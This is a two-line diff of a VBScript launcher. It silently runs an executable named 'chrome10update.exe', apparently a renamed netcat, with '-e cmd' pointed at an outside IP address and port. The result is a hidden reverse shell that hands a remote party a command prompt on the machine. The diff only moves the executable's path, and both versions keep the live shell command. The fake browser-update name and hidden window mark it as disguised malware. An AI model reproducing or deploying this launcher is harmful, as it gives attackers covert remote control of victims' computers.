@@ -1,2 +1,2 @@
 Set OOshell = wscript.createobject("wscript.shell")
-OOshell.run "%USERPROFILE%\downloads\chrome10update.exe -nv 3.22.30.40 22056 -e cmd", 0, False
+OOshell.run "%USERPROFILE%\chrome10update.exe -nv 3.22.30.40 22056 -e cmd", 0, False
